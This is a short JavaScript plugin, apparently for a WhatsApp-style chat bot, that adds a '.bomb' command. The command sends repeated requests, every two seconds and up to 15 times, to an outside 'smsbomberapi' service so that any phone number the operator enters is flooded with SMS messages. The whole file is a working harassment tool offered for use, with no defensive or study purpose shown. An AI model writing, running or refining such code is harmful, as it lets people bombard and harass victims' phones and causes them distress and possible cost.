const { cmd } = require('../command');
const SMS_API = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=";
let isBombing = false;
let bombCount = 0;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "SMS Bombing (Any Number)",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    if (!isOwner) return reply("❌ Owner only!");

    // STOP if already running
    if (isBombing) {
        isBombing = false;
        return reply(`✅ Stopped! Sent ${bombCount} SMS`);
    }

    // Extract ANY number (digits only)
    const number = text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!number || number.length < 5) {
        return reply("❌ Invalid number! Use: .bomb 923001234567");
    }

    // Start bombing
    isBombing = true;
    bombCount = 0;
    reply(`💣 Bombing STARTED on ${number}`);

    const bombInterval = setInterval(async () => {
        if (!isBombing || bombCount >= 15) {
            clearInterval(bombInterval);
            isBombing = false;
            return reply(`✅ Sent ${bombCount} SMS`);
        }

        try {
            const apiUrl = `${SMS_API}${number}`;
            const response = await fetch(apiUrl);
            
            if (response.ok) {
                bombCount++;
            } else {
                throw new Error(`API Error: ${response.status}`);
            }
        } catch (error) {
            console.error(error);
            clearInterval(bombInterval);
            isBombing = false;
            reply(`❌ Failed: ${error.message}`);
        }
    }, 2000); // 2-second delay
});
